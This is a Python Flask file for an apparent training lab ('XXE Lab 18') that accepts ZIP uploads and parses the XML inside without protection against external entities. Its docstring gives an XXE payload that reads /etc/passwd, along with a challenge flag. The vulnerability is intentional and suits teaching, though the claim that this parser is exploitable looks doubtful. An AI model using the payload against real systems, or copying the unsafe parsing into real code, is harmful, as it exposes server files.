"""
XXE Lab 18: XXE via Zip Archive Injection
Difficulty: 4 (Expert)
Points: 150

Description:
XXE in compressed archive processing.
"""

from flask import Flask, request, send_file
from io import BytesIO
import zipfile
import xml.etree.ElementTree as ET
import os

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: XXE in ZIP archive processing
    
    Attack Vector:
    1. Create ZIP with malicious XML:
    
    zip_file = ZipFile('archive.zip', 'w')
    xml_payload = '''<?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <foo>&xxe;</foo>'''
    zip_file.writestr('payload.xml', xml_payload)
    zip_file.close()
    
    2. Upload and server extracts XXE-containing XML
    
    Flag: FLAG{xxe_zip_injection_018}
    """
    result = None
    error = None
    
    if 'zipfile' in request.files:
        file = request.files['zipfile']
        try:
            zip_buffer = BytesIO(file.read())
            with zipfile.ZipFile(zip_buffer, 'r') as zf:
                for name in zf.namelist():
                    if name.endswith('.xml'):
                        xml_content = zf.read(name).decode('utf-8')
                        # VULNERABLE: Parse XML from ZIP without XXE prevention
                        root = ET.fromstring(xml_content)
                        result = f"Extracted from {name}: {ET.tostring(root, encoding='unicode')}"
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>XXE via ZIP Archive</h1>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="zipfile" accept=".zip">
            <button>Upload & Extract</button>
        </form>
        {f"<pre>{result}</pre>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5018, debug=False)
